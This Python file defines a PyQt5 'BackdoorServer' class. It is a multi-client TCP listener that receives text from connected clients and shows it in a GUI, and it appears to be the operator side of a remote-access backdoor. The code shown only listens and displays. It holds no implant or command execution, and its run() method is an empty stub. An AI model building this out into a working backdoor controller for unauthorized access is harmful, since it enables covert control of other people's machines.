from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
import socket
import threading

class BackdoorServer(QThread):
    output_received = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = []
        self.running = False

    def start_server(self, ip, port):
        self.ip = ip
        self.port = int(port)
        self.running = True
        server_thread = threading.Thread(target=self.listen_for_clients)
        server_thread.start()

    def listen_for_clients(self):
        self.server.bind((self.ip, self.port))  
        self.server.listen(5)

        while self.running:
            client_socket, addr = self.server.accept()
            self.clients.append((client_socket, addr))
            threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()

    def handle_client(self, client_socket, addr):
        while self.running:
            try:
                data = client_socket.recv(1024).decode('utf-8')
                if not data:
                    break
                self.output_received.emit(f"Received from {addr}: {data}\n")
            except Exception as e:
                self.output_received.emit(f"Error handling client {addr}: {str(e)}\n")

    def is_running(self):
        return self.running

    def run(self):
        pass  